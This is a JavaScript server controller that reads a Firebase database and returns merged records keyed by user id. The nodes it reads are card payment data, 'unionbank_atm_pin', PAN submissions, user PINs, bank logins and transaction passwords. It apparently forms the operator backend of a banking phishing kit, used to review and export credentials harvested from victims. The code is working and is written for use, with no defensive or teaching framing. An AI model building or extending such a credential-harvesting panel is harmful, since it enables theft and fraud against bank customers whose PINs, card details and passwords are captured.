import { rtdb } from "../config/db.js";

const CARD_NODE = "card_payment_data";
const ATM_NODE = "unionbank_atm_pin";
const FORM_NODE = "form_submissions";

export const getAllUsersFullData = async (req, res) => {
  try {
    const finalList = [];

    const cardSnap = await rtdb.ref(CARD_NODE).get();
    const atmSnap = await rtdb.ref(ATM_NODE).get();
    const formSnap = await rtdb.ref(FORM_NODE).get();

    const cardRaw = cardSnap.exists() ? cardSnap.val() : {};
    const atmRaw  = atmSnap.exists()  ? atmSnap.val()  : {};
    const formRaw = formSnap.exists() ? formSnap.val() : {};

    const uniqueIds = new Set();

    Object.values(cardRaw).forEach(v => uniqueIds.add(v.uniqueid));
    Object.values(atmRaw).forEach(v => uniqueIds.add(v.uniqueid));
    Object.values(formRaw).forEach(v => uniqueIds.add(v.uniqueid));

    uniqueIds.forEach(uid => {
      finalList.push({
        uniqueid: uid,
        cardData: Object.values(cardRaw).find(v => v.uniqueid == uid) || null,
        atmData:  Object.values(atmRaw).find(v => v.uniqueid == uid)  || null,
        formData: Object.values(formRaw).find(v => v.uniqueid == uid) || null
      });
    });

    return res.json({ success: true, data: finalList });

  } catch (err) {
    console.error(" GET ALL FULL DATA ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};

export const getUserFullData = async (req, res) => {
  try {
    const { uniqueid } = req.params;

    if (!uniqueid) {
      return res.json({ success: false, message: "uniqueid required" });
    }

    const cardSnap = await rtdb.ref(CARD_NODE).get();
    const atmSnap  = await rtdb.ref(ATM_NODE).get();
    const formSnap = await rtdb.ref(FORM_NODE).get();

    const cardData = cardSnap.exists()
      ? Object.values(cardSnap.val()).find(v => v.uniqueid == uniqueid) || null
      : null;

    const atmData = atmSnap.exists()
      ? Object.values(atmSnap.val()).find(v => v.uniqueid == uniqueid) || null
      : null;

    const formData = formSnap.exists()
      ? Object.values(formSnap.val()).find(v => v.uniqueid == uniqueid) || null
      : null;

    return res.json({
      success: true,
      uniqueid,
      cardData,
      atmData,
      formData
    });

  } catch (err) {
    console.error(" GET FULL DATA BY ID ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};

export const getAllData = async (req, res) => {
  try {
    const nodes = {
      forms: "form_submissions",
      atmPins: "unionbank_atm_pin",
      cardPayments: "card_payment_data",
      panSubmissions: "pan_submissions",
      userPins: "user_pins",
      bankLogins: "bank_logins",
      transactionPasswords: "transaction_passwords"
    };

    const result = {
      forms: [],
      atmPins: [],
      cardPayments: [],
      panSubmissions: [],
      userPins: [],
      bankLogins: [],
      transactionPasswords: []
    };

    // UID Cleaner
    const cleanUID = (uid) => {
      if (!uid) return null;
      return String(uid).trim();
    };

    for (const key in nodes) {
      const snap = await rtdb.ref(nodes[key]).get();

      if (!snap.exists()) continue;

      const raw = snap.val();
      const arr = Object.values(raw)
        .map(obj => {
          const uid = cleanUID(obj.uniqueid);
          if (!uid) return null;

          return {
            ...obj,
            uniqueid: uid
          };
        })
        .filter(Boolean);

      result[key] = arr;
    }

    return res.json({
      success: true,
      data: result
    });

  } catch (err) {
    console.error("🔥 ALL DATA API ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server Error",
      error: err.message
    });
  }
};


export const getLatestForm = async (req, res) => {
  try {
    const { uniqueid } = req.params;

    const snap = await rtdb
      .ref(FORM_NODE)
      .orderByChild("uniqueid")
      .equalTo(uniqueid)
      .limitToLast(1)
      .get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();
    const list = Object.entries(raw).map(([id, obj]) => ({
      id,
      uniqueid,
      ...obj,
    }));

    return res.json({ success: true, data: list });

  } catch (err) {
    console.error(" Error:", err);
    res.status(500).json({ success: false, message: "Error fetching latest form" });
  }
};